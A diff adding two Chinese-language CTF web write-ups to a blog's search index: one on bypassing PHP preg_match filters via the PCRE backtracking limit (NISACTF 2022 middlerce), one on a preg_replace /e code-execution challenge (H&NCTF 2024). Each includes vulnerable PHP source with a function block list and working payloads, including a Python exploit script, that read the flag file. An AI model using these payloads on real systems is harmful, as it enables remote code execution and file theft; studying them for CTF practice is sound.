@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>PHP利用PCRE回溯次数限制绕过</title>
+    <link href="/2024/05/14/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
+    <url>/2024/05/14/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</url>
+    
+    <content type="html"><![CDATA[<p>刷题碰到了这种题目，记录一下知识点。</p><p>首先可以拜读一下p神的文章，还是很有收获的。</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#reply-list">文章</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>然后我也简要的说一下吧。</p><p>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></li></ul><p>就以p神举的例子，我们正则&lt;?.*[(&#96;;?&gt;].*,然后输入&lt;?php phpinfo();&#x2F;&#x2F;aaaaa这个内容</p><p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();&#x2F;&#x2F;aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(&#96;;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的&#x2F;&#x2F;aaaaa，完成正则。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>是先看到的题目，然后才开始找知识点的。<a href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p><p>先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>include &quot;check.php&quot;;<br>if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;<br>    $txw4ever = $_REQUEST[&#x27;letter&#x27;];<br>    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;<br>        die(&quot;再加把油喔&quot;);<br>    &#125;<br>    else&#123;<br>        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];<br>        checkdata($command);<br>        @eval($command);<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>我们只分析这篇的知识点，和上面讲的差不多，cmd绕过后eval进行读取</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>rce</tag>
+      
+      <tag>正则表达式</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>H&amp;NCTF</title>
+    <link href="/2024/05/13/H&amp;NCTF%202024/"/>
+    <url>/2024/05/13/H&amp;NCTF%202024/</url>
+    
+    <content type="html"><![CDATA[<p>前言：比赛也没怎么打，就看了看，自己会的还是太少了，等师傅们发完wp想看看复现一遍的，先写写记录一下知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><p>***知识点:***rce绕过-编码绕过</p><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><em><strong>分析：</strong></em>post传入两个值，task正则绕过，flag大小写绕过</p><p>​然后replace，意思就是执行task传入的内容。</p><p><em><strong>解题：</strong></em>首先构造flag，我们随便改个大小写就行，<code>please_give_me_flaG</code>,然后看task，常用的rce函数都被禁用了，我尝试了scandir读取内容失败了，学习了一会，可以先base64加密再解密得到想要的&#x2F;flag，</p><p>payload:<code>task=var_dump(readfile(base64_decode(&quot;L2ZsYWc=&quot;)))&amp;flag=please_give_me_flaG</code></p><p><img src="/../images/H&NCTF/rce.png" alt="rce"></p><p>也可以用rot-13解密，<code>task=var_dump(readfile(str_rot13(&quot;/synt&quot;)))&amp;flag=please_give_me_flaG</code></p><p>这样也是可以的，可以多尝试看看。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>DozerCTF2024</title>
     <link href="/2024/04/28/Dozerctf/Dozerctf2024/"/>
     <url>/2024/04/28/Dozerctf/Dozerctf2024/</url>
